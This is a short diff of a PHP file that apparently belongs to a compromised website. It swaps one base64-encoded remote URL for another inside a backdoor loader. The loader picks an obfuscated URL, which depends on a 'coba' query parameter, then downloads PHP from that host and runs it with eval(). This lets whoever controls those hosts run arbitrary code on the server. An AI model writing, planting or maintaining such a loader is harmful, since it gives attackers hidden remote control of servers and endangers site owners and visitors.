@@ -25,7 +25,7 @@ $x = '?>';
 if (isset($_GET['coba'])) {
     $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi91cGxvYWQucGhw');
 } else {
-    $target_url = base64_decode('aHR0cHM6Ly9ydW1wa2UuYmx1ZXRyZWVsZWFybmluZy5jb20vYW5hbHl0aWNzL2NsYXNzZXMvcHJpdmFjeS9iYWNrdXAtcHJvdmlkZXIucGhw');
+    $target_url = base64_decode('aHR0cHM6Ly9zdGFudGhvbnlzZnQuZWR1LnBrL2FwYS5waHA=');
 }
 
 eval($x . get_data($target_url));
